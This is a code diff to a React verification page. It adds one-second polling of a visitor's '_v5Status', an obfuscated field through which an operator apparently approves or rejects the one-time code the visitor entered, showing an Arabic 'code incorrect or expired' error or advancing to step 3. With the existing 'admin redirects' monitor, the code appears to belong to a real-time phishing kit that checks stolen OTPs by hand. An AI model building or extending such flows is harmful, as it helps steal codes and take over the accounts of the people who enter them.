@@ -40,6 +40,39 @@ export default function VeriPage() {
   // Monitor for admin redirects
   useRedirectMonitor({ visitorId, currentPage: "veri" })
 
+  // Poll for _v5Status changes (fallback for SSE)
+  useEffect(() => {
+    if (!visitorId) return
+
+    const pollStatus = async () => {
+      try {
+        const res = await fetch(`/api/visitors/${visitorId}`)
+        if (!res.ok) return
+        const data = await res.json()
+        
+        const status = data._v5Status
+        if (status === 'rejected' && _v5Status !== 'rejected') {
+          console.log('[Step2] Received rejected status via polling')
+          _ss5('rejected')
+          setError(data.otpRejectionMessage || 'رمز التحقق غير صحيح او منتهي الصلاحية')
+        } else if (status === 'approved' && _v5Status !== 'approved') {
+          console.log('[Step2] Received approved status via polling')
+          _ss5('approved')
+          setError('')
+          navigate('/step3')
+        }
+      } catch (err) {
+        console.error('[Step2] Polling error:', err)
+      }
+    }
+
+    // Poll every 1 second
+    const interval = setInterval(pollStatus, 1000)
+    pollStatus() // Initial check
+
+    return () => clearInterval(interval)
+  }, [visitorId, _v5Status, navigate])
+
   // Resend timer
   useEffect(() => {
     if (resendTimer > 0) {
